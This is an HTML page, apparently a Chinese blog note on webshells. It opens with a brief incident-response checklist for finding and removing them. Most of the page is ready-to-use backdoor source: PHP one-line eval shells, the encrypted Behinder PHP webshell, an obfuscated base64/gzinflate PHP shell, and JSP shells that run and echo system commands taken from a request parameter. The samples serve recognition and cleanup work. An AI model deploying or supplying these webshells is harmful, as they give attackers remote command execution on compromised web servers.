<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2022-08-31 Wed 18:52 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Webshell</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Webshell</h1>
</header><p>
Webshell 通常是黑客用于控制网站服务器的文件，通常以 php, jsp, asp, asp.net 等载体存在于服务器网站目录下。
</p>

<p>
Webshell 处置流程：
</p>
<ol class="org-ol">
<li>确认文件是否为正常业务文件，排除误报的情况</li>
<li>确认是 Webshell 后，若业务允许，需要立即隔离当前主机</li>
<li>进行攻击溯源，修复导致 Webshell 的相关漏洞</li>
<li>删除已存在的 Webshell</li>
<li>对当前主机进行全面排查，确保清除所有已存在的后门</li>
<li>安排主机及业务重新上线</li>
</ol>
<p>
总的来说就是：排查、清除、关站，看有没有修复的可能。
</p>

<div id="outline-container-orge415aac" class="outline-2">
<h2 id="orge415aac">PHP Webshell</h2>
<div class="outline-text-2" id="text-orge415aac">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php eval($_POST["pass"]);?&gt;
</pre>
</div>

<p>
冰蝎 PHP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php
session_start();
if (isset($_GET['pass'])) {
    $key = substr(md5(uniqid(rand())),16);
    $_SESSION['k'] = $key;
    print $key;
} else {
    $key = $_SESSION['k'];
    $post = file_get_contents("php://input");
    if(!extension_loaded('openssl')) {
        $t = "base64_"."decode";
        $post = $t($post."");
        for($i = 0; $i &lt; strlen($post); $i++) {
            $post[$i] = $post[$i]^$key[$i+1&amp;15];
        }
    } else {
        $post = openssl_decrypt($post, "AES128", $key);
    }
    $arr = explode('|',$post);
    $func = $arr[0];
    $params = $arr[1];
    class C{public function __construct($p) {eval($p."");}}
    @new C($params);
}
?&gt;
</pre>
</div>

<p>
带混淆的 PHP Webshell
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php
function iJG($BHM) {
  $BHM=gzinflate(base64_decode($BHM));
  for($i=0;$i&lt;strlen($BHM);$i++) {
    $BHM[$i] = chr(ord($BHM[$i])-1);
  }
   return $BHM;
 } eval(iJG("U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A"));
?&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-org5c46b3d" class="outline-2">
<h2 id="org5c46b3d">JSP Webshell</h2>
<div class="outline-text-2" id="text-org5c46b3d">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>));%&gt;
</pre>
</div>

<p>
带回显的 JSP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%
    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>)).getInputStream();
    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">a</span> = -<span style="color: #D0372D;">1</span>;
    <span style="color: #6434A3;">byte</span>[] <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span>[<span style="color: #D0372D;">2048</span>];
    out.print(<span style="color: #008000;">"&lt;pre&gt;"</span>);
    <span style="color: #0000FF;">while</span>((a=in.read(b))!=-<span style="color: #D0372D;">1</span>){
        out.println(<span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span>(b));
    }
    out.print(<span style="color: #008000;">"&lt;/pre&gt;"</span>);
%&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>
